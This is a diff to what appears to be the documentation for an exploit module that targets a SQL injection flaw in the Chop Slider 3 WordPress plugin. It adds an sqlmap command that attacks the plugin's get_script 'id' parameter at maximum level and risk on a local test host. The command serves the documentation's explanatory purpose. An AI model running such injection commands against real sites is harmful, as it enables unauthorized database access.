@@ -8,6 +8,12 @@ parameters, and thus must be encoded, and magic_quotes is applied at the server.
 The plugin can be downloaded from
 [github](https://github.com/idangerous/Plugins/blob/master/Chop%20Slider%203/Chop%20Slider%203%20Wordpress/Wordpress_ChopSlider_3_4.zip)
 
+This module slightly replicates sqlmap running as:
+
+```
+sqlmap -u 'http://local.target/wp-content/plugins/chopslider/get_script/index.php?id=1111111111' --level=5 --risk=3 --technique=B
+```
+
 ## Verification Steps
 
 1. Install the plugin and activate it
